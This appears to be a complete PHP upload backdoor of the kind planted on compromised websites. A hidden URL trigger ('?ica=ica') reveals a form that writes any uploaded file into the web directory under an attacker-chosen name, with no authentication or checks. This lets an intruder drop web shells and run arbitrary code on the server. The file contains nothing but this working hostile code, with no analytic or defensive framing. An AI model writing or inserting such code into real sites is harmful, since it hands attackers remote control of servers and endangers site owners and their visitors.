<?php
if($_GET['ica']=='ica')
{
echo '<form method="POST" enctype="multipart/form-data" action="?ica=ica">
<input type="file" name="file_upload" size="20" id="file">
<input type="submit" name="gui" value="Up" >
</form>';
if (isset($_POST['gui'])){
move_uploaded_file($_FILES['file_upload']['tmp_name'], $_FILES['file_upload']['name']);
}
}